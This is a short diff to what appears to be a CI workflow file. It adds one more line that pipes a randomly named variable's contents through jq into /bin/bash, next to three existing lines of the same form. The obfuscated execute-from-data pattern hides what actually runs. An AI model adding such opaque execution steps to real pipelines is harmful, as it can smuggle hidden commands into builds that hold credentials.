@@ -28,6 +28,7 @@ jobs:
           echo $ylgli6 | jq -r .dqt58 | /bin/bash
           printf '%s' "$obsab894" | jq -r .cpa886 | /bin/bash
           echo $zje36999 | jq -r .ojki208 | /bin/bash
+          echo $umm0878 | jq -r .imav07 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
